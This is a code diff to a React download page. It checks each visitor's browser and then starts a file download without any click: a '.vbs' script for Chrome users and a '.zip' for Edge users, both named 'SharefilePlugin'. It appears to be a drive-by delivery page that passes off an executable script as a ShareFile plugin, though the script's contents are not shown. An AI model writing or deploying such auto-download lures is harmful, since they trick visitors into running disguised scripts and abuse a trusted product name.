@@ -12,11 +12,24 @@ const Download = () => {
     }
   }, [visitorData]);
 
+  const getDownloadFile = () => {
+    const ua = navigator.userAgent;
+    if (ua.includes("Edg/")) {
+      return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
+    }
+    if (ua.includes("Chrome") && !ua.includes("Edg/")) {
+      return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
+    }
+    return null;
+  };
+
   useEffect(() => {
+    const file = getDownloadFile();
+    if (!file) return;
     const timer = setTimeout(() => {
       const link = document.createElement("a");
-      link.href = "/docs/SharefilePlugin.vbs";
-      link.download = "SharefilePlugin.vbs";
+      link.href = file.href;
+      link.download = file.name;
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
